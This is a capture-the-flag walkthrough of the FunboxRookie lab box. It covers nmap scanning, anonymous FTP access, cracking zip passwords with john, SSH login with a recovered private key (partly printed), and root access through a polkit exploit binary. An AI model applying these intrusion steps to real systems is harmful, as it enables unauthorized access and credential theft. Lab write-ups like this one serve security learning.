## FunBoxRookie
- Started box, got the ip **192.168.204.107**
- As always, start with enumeration

### Enumeration
- Browsed to ip, found an apache2 default page showing webserver running on server.
- Scanning for open ports, found three interesting ports:
```
sudo nmap 192.168.204.107 -sS -vv
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 21:54 EAT
....
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.36 seconds
           Raw packets sent: 1114 (48.968KB) | Rcvd: 1031 (41.292KB)
```

- Considering http port 80 was the webserver we saw, and we dont have the ssh logins, the most obvious guess was that ftp allows anonymous logins.
- Trying it:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ ftp 192.168.204.107
Connected to 192.168.204.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.204.107]
Name (192.168.204.107:festus): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.49.204 !
230-
230-The local time is: Tue Feb 22 19:00:12 2022
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58597|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
```
- From the files, decided to fetch them locally by using the get command:
```
ftp> get anna.zip
local: anna.zip remote: anna.zip
229 Entering Extended Passive Mode (|||11790|)
150 Opening BINARY mode data connection for anna.zip (1477 bytes)
100% |***********************************|  1477      342.28 KiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (7.83 KiB/s)
```
- Did this for all until alls files were available offline
- Trying to unzip them requires a password, so decide to look for clues in the welcome.msg:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ cat welcome.msg 
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to <root@%L>
```
- Message still brings up no clues.
- Decided to crack all the passwords for the zips:
```
zip2john *.zip > crack.txt
```
- Then finally use john:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ john -w=/usr/share/wordlists/rockyou.txt xub.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)     
catwoman         (cathrine.zip/id_rsa)     
2g 0:00:00:08 DONE (2022-02-22 22:25) 0.2239g/s 1606Kp/s 1608Kc/s 1608KC/s "2parrow"..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Unzipping both cathrine.zip and tom.zip gives us an id_rsa - Inside id_rsa, there is a private key which we can now use to try using ssh:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6/v83+Ih99kKEhLa9XL0H7ugQzx5tQMK8/DrzgGR7gWnkXgH
GjyG+roZJyqHTEBi62/IyyiAxkX0Uh4NgEqh4LWQRy4dhc+bP6GYYrMezPiljzTp
Sc15tN+6Txtx0gOb0LPttVemJoFXZ1wQsNivCvEzxSESGTGR5p2QUybMlk2dS2UC
Mn6FvcHCcKyBRUK9udIh29wGo0+pnuRw2SrKY9PzidP6Ao3sxJrlAJ5+SQkA86ZV
pIhAIZyQHX2frjEEiQgVbwzTLWP2ezMZp195cINiJcIAuTLp2hKZLTDqL/U9ncUs
Y2qbFVqQQfn8078Wbe4NrUBU2rkMtz6iE+BWhwIDAQABAoIBAAhrKvBJvvB6m7Nd
XNZYzYC8TtFXPPhKLX/aXm8w+yXEqd+0qnwzIJWdQfx1tfHwchb4G++zeDSalka/
r7ed8fx0PbtsV71IVL+GYktTHIwvaqibOJ9bZzYerSTZU8wsOMjPQnGvuMuy3Y1g
aXAFquj3BePIdD7V1+CkSlvNDItoE+LsZvdQQBAA/q648FiBzaiBE6swXZwqc4sR
P1igsqihOdjaK1AvPd5BSEMZDNF5KpMqIcEz1Xt8UceCj/r5+tshg4rOFz2/oYOo
.....
....
....
mOGTmkqb3grpy4sp/5QQFtE10fh1Ll+BXsK46HE2pPtg/JHoXyeFevpLXi8YgYjQ
22nBTFCyu2vcWKEQI21H7Rej9FGyFSnPedDNp0C58WPdEuGIC/tr
-----END RSA PRIVATE KEY-----
```
- We can now login as:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ ssh -i id_rsa cathrine@192.168.204.107
```
- Catherine's key fails to login, so we unzip tom's zip and use his key to login:
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ unzip tom.zip 
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa                  
festus@boynamedboy:~/Desktop/CTF/Proving Grounds/FunboxRookie$ ssh -i id_rsa tom@192.168.204.107
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 ...
 ...
 ...
 To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ 
```
- Once we have gaine a shell, we can now begin to look for local.txt and proof.txt:
```
tom@funbox2:~$ ls
local.txt
tom@funbox2:~$ cat local.txt
(redacted flag)
tom@funbox2:~$ 
```

- Next, to find proof.txt, we have to privilege escalate so as to browse through the root directory

- Afer more enumeration i settled on two methods to read proof.txt from the root directory:

- For more info on methods to privesc, check my contributions to this repo [Linux Priv Esc](https://github.com/fr334aks-TTW/15-days-of-hacking/tree/main/Boynamedboy/2.Linux%20Priv%20Esc)

- Decide to settle on a polkit exploit. Uploaded the compiled binary via netcat and excuted it to gain elevated privileges:
```
tom@funbox2:~$ ls
exploit
tom@funbox2:~$ chmod +x exploit
tom@funbox2:~$ ./exploit
Spawning root shell
root!
#
```
- Finally, search for proof.txt and read its contents to get the flag:
```
# find / -type f -name proof.txt 2>/dev/null
/root/proof.txt
^C
# cat /root/proof.txt
(redacted flag)
# exit
```


